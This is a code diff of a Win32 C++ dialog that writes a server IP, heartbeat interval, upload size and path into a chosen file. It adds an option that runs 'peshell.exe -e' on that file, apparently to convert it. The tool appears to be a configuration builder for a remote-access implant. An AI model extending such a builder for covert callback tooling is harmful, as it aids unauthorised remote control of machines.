@@ -25,6 +25,8 @@ MyDialog::~MyDialog() {
 
 }
 
+//USER APPDATA
+
 string selectFileName() {
 	int ret = 0;
 	OPENFILENAMEA opfn = { 0 };
@@ -32,11 +34,11 @@ string selectFileName() {
 	opfn.lStructSize = sizeof(OPENFILENAMEA);
 	opfn.lpstrFilter = "所有文件\0*.*\0\0";
 	//指向一对以空字符结束的过滤字符串的一个缓冲。缓冲中的最后一个字符串必须以两个  NULL字符结束。
-	opfn.nFilterIndex = 1;    //指定在文件类型控件中当前选择的过滤器的索引
+	opfn.nFilterIndex = 1;			//指定在文件类型控件中当前选择的过滤器的索引
 	opfn.lpstrFile = file_name;
-	opfn.lpstrFile[0] = '\0'; //这个缓冲的第一个字符必须是NULL
+	opfn.lpstrFile[0] = '\0';		//这个缓冲的第一个字符必须是NULL
 	opfn.nMaxFile = sizeof(file_name);
-	opfn.Flags = 0;  //OFN_FILEMUSTEXIST OFN_PATHMUSTEXIST指定用户仅可以在文件名登录字段中输入已存在的文件的名字。	
+	opfn.Flags = 0;					//OFN_FILEMUSTEXIST OFN_PATHMUSTEXIST指定用户仅可以在文件名登录字段中输入已存在的文件的名字。	
 	ret = GetOpenFileNameA(&opfn);
 	if (ret)
 	{
@@ -45,7 +47,7 @@ string selectFileName() {
 	return "";
 }
 
-int writeRunningParams(string filename,char * ip,char * hbi,char * uploadsize,char * path,int bhttps) {
+int writeRunningParams(string filename,char * ip,char * hbi,char * uploadsize,char * path,int bhttps,int shell) {
 
 	int ret = 0;
 	char* file = 0;
@@ -86,6 +88,12 @@ int writeRunningParams(string filename,char * ip,char * hbi,char * uploadsize,ch
 
 			ret = FileHelper::fileWriter(filename.c_str(), file, filesize, FILE_WRITE_NEW);
 
+			if (shell)
+			{
+				string cmd = string("peshell.exe -e ") + filename;
+				ret = WinExec(cmd.c_str(), SW_SHOW);
+			}
+
 			return ret;
 		}
 	}
@@ -98,6 +106,12 @@ int writeRunningParams(string filename,char * ip,char * hbi,char * uploadsize,ch
 int __stdcall MyDialog::runDialog(MyDialog* dialog) {
 	int ret = 0;
 
+#define _DIALOG_BOX
+#ifdef _DIALOG_BOX
+	dialog->m_hwnd = (HWND)DialogBoxParamA(dialog->m_hinst, (LPCSTR)IDD_DIALOG1, 0, (DLGPROC)dlgProc, 0);
+#else
+	//dialog->m_hwnd = CreateDialogIndirectParamA(dialog->m_hinst, (LPCSTR)IDD_DIALOG1, 0, (DLGPROC)dlgProc, 0);
+	//dialog->m_hwnd = CreateDialogParamA(dialog->m_hinst, (LPCSTR)IDD_DIALOG1, 0, (DLGPROC)dlgProc, 0);
 	dialog->m_hwnd = CreateDialogA(dialog->m_hinst, (LPCSTR)IDD_DIALOG1, 0, (DLGPROC)dlgProc, 0);
 	if (dialog->m_hwnd == 0)
 	{
@@ -116,15 +130,14 @@ int __stdcall MyDialog::runDialog(MyDialog* dialog) {
 
 		if (ret == 0)
 		{
-			printf("hello\r\n");
 			break;
 		}
 
- 		ret = IsDialogMessage(dialog->m_hwnd, &msg);
+		ret = IsDialogMessage(dialog->m_hwnd, &msg);
 		if (ret)
 		{
-			//TranslateMessage(&msg);
-			//DispatchMessage(&msg);
+			TranslateMessage(&msg);
+			DispatchMessage(&msg);
 		}
 	}
 
@@ -132,6 +145,8 @@ int __stdcall MyDialog::runDialog(MyDialog* dialog) {
 		delete g_mydialog;
 		g_mydialog = 0;
 	}
+#endif
+
 
 	return 0;
 }
@@ -172,18 +187,18 @@ INT_PTR MyDialog::dlgProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
 			int len = 0;
 			char fn[0x1000];
 			char info[1024];
-			len = GetDlgItemTextA(g_mydialog->m_hwnd, IDC_EDIT5, fn,sizeof(fn));
+			len = GetDlgItemTextA(hwnd, IDC_EDIT5, fn,sizeof(fn));
 			if (len )
 			{
 				char szip[64];
-				len = GetDlgItemTextA(g_mydialog->m_hwnd, IDC_EDIT1, szip, sizeof(szip));
+				len = GetDlgItemTextA(hwnd, IDC_EDIT1, szip, sizeof(szip));
 				if (len > 0)
 				{
 					DWORD ip = inet_addr(szip);
 					if (ip != -1)
 					{
 						char szhbi[16];
-						len = GetDlgItemTextA(g_mydialog->m_hwnd, IDC_EDIT3, szhbi, sizeof(szhbi));
+						len = GetDlgItemTextA(hwnd, IDC_EDIT3, szhbi, sizeof(szhbi));
 						if (len > 0)
 						{
 						}
@@ -192,7 +207,7 @@ INT_PTR MyDialog::dlgProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
 						}
 
 						char szfz[256];
-						len = GetDlgItemTextA(g_mydialog->m_hwnd, IDC_EDIT2, szfz, sizeof(szfz));
+						len = GetDlgItemTextA(hwnd, IDC_EDIT2, szfz, sizeof(szfz));
 						if (len > 0)
 						{
 
@@ -202,7 +217,7 @@ INT_PTR MyDialog::dlgProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
 						}
 
 						char szdir[MAX_PATH];
-						len = GetDlgItemTextA(g_mydialog->m_hwnd, IDC_EDIT4, szdir, sizeof(szdir));
+						len = GetDlgItemTextA(hwnd, IDC_EDIT4, szdir, sizeof(szdir));
 						if (len > 0)
 						{
 
@@ -210,9 +225,11 @@ INT_PTR MyDialog::dlgProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
 						else {
 						}
 
-						int https = IsDlgButtonChecked(g_mydialog->m_hwnd, IDC_CHECK1);
+						int https = IsDlgButtonChecked(hwnd, IDC_CHECK1);
 
-						ret = writeRunningParams(fn, szip, szhbi, szfz, szdir, https);
+						int shell = IsDlgButtonChecked(hwnd, IDC_CHECK2);
+
+						ret = writeRunningParams(fn, szip, szhbi, szfz, szdir, https,shell);
 						if (ret == 0)
 						{
 							wsprintfA(info, "Write File error:%d", GetLastError());
@@ -237,7 +254,7 @@ INT_PTR MyDialog::dlgProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
 		{
 			string fn = selectFileName();
 
-			int ret = SetDlgItemTextA(g_mydialog->m_hwnd, IDC_EDIT5, fn.c_str());
+			int ret = SetDlgItemTextA(hwnd, IDC_EDIT5, fn.c_str());
 		}
 	}
 	else if (msg == WM_SYSCOMMAND)
@@ -262,10 +279,14 @@ INT_PTR MyDialog::dlgProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
 	{
 		printf("hello\r\n");
 	}
-// 	else if (msg == WM_CHAR)
-// 	{
-// 		printf("hello\r\n");
-// 	}
+	else if (msg == WM_CHAR)
+	{
+		printf("hello\r\n");
+	}
+	else if (msg == WM_KEYDOWN)
+	{
+	printf("hello\r\n");
+	}
 	else if (msg == WM_RBUTTONDOWN)
 	{
 
